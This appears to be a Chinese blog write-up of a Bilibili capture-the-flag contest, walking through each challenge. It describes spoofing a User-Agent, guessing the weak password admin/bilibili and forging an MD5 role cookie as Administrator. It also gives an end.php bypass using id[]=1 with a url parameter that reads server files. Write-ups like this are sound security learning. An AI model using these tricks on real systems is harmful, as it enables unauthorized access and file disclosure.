---
title: 首届Bilibili安全挑战赛
categories:
  - CTF
tags:
  - CTF
abbrlink: 7ce15f2f
date: 2022-11-28 19:26:55
updated: 2022-11-28 19:26:55
---
#CTF 
这波啊，这波是全国上下共享一个靶机

# 页面的背后是什么？

#### 题目地址： [http://45.113.201.36/index.html](http://45.113.201.36/index.html)

是叔叔我啊！
<!--more-->
直接查看源码，看到

 $.ajax({
    url: "api/admin",
    type: "get",
    success:function (data) {
        //console.log(data);
        if (data.code == 200){
            // 如果有值：前端跳转
            var input = document.getElementById("flag1");
            input.value = String(data.data);
        } else {
            // 如果没值
            $('#flag1').html("接口异常，请稍后再试～");
        }
    }
})

请求api/admin，得到flag

# 真正的秘密只有特殊的设备才能看到

$.ajax({
    url: "api/ctf/2",
    type: "get",
    success:function (data) {
        //console.log(data);
        if (data.code == 200){
            // 如果有值：前端跳转
            $('#flag2').html("flag2: " + data.data);
        } else {
            // 如果没值
            $('#flag2').html("需要使用bilibili Security Browser浏览器访问～");
        }
    }
})

根据提示，伪造UserAgent: `bilibili Security Browser`

# 密码是啥？

是陈睿叔叔的生日

很简单，弱口令

用户名admin，密码bilibili

# 对不起，权限不足～

依旧靠猜，提示超级管理员才能看到，抓包，发现cookie里面有个role

Cookie: role=7b7bc2512ee1fedcd76bdc68926d4f7b; session=eyJ1aWQiOiI4NjY0MzIxIn0.X5QmyQ.nJVuwtiLPHwl0tdBr-QoXYew0jE

把role拿去md5解密，得到user，接下来就是猜管理员的名字了。

superadmin，admin，su，root，superuser全都不对，最后看到别人的提示，Windows超级管理员，这才知道是Administrator。傻不傻啊

# 结束亦是开始

根据提示，把single改为end，得到 你想要的不在这儿～，然后，就没有然后了

根据群里大佬的思路，扫目录，发现test.php下有东西，一堆jsfuck代码

放进浏览器执行，得到：

var str1 = "\u7a0b\u5e8f\u5458\u6700\u591a\u7684\u5730\u65b9";
var str2 = "bilibili1024havefun";
console.log()

解码str1，`"程序员最多的地方"`，那就是github了。

进GitHub搜索第二个字符串`bilibili1024havefun`，找到一个end.php的源码

<?php

//filename end.php

$bilibili = "bilibili1024havefun";

$str = intval($_GET['id']);
$reg = preg_match('/\d/is', $_GET['id']);

if(!is_numeric($_GET['id']) and $reg !== 1 and $str === 1){
	$content = file_get_contents($_GET['url']);
	
	//文件路径猜解
	if (false){
		echo "还差一点点啦～";
	}else{
		echo $flag;
	}
}else{
	echo "你想要的不在这儿～";
}
?>

好家伙，真就硬猜呗

根据源码绕过+猜路径，构造url

http://120.92.151.189/blog/end.php?id[]=1&url=/api/ctf/6/flag.txt

然而得到的却是第十题的答案

  

七八九十待续。。。